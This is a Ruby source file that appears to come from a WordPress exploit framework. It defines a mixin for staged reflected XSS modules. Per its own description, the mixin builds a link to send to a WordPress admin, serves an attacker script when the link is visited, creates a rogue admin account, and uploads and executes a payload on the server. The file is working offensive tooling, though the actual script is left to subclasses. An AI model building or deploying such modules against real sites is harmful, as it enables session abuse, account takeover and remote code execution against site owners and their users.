# Provides reusable functionality for reflected XSS modules.
module Wpxf::WordPress::StagedReflectedXss
  include Wpxf::WordPress::ReflectedXss

  def initialize
    super
    @success = false
    register_option(initial_req_path_opt)
    @info[:desc] = 'This module prepares a payload and link that can be sent '\
                   'to an admin user which when visited with a valid session '\
                   'will create a new admin user which will be used to upload '\
                   'and execute the selected payload in the context of the '\
                   'web server.'
  end

  def initial_req_path_opt
    StringOption.new(
      name: 'initial_req_path',
      desc: 'The path to be used to identify the initial request',
      required: true,
      default: Utility::Text.rand_alpha(rand(5..10))
    )
  end

  def initial_req_path
    normalized_option_value('initial_req_path')
  end

  def on_http_request(path, params, headers)
    if path.eql? normalize_uri(xss_path, initial_req_path)
      emit_info 'Initial request received...'
      return { type: 'text/html', body: initial_script }
    else
      super
    end
  end

  def url_with_xss
    normalize_uri(xss_url, initial_req_path)
  end

  def run
    unless respond_to? 'initial_script'
      raise 'Required method "initial_script" has not been implemented'
    end

    super
  end
end
